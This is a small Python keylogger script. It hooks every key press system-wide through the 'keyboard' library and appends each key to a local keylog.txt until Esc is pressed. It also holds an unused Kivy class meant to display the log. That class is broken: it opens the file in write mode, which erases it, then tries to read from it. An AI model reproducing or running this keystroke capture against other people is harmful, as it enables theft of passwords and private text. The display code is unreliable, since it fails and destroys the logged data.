import keyboard
from kivy.app import App
from kivy.uix.label import Label
from kivy.core.window import Window

file: str = "keylog.txt"
Window.size = (500, 50)

def log_key_to_file(event) -> None:
    """Log key presses to a file."""
    key = str(event.name)
    with open(file, "a") as lk:  # Use "a" mode to append instead of overwrite
        lk.write(key + "\n")

def main() -> None:
    # Listen for key press events and log each key press to the file
    keyboard.on_press(log_key_to_file)
    print(f"Logging keys to {file} Press 'esc' to stop.")
    
    # Block until 'esc' is pressed
    keyboard.wait('esc')


class TextDisplayApp(App):
    def build(self):
        with open(file, "w") as disp:
            text = disp.read()
        return Label(text, font_size='20sp')


if __name__ == "__main__":
    main()
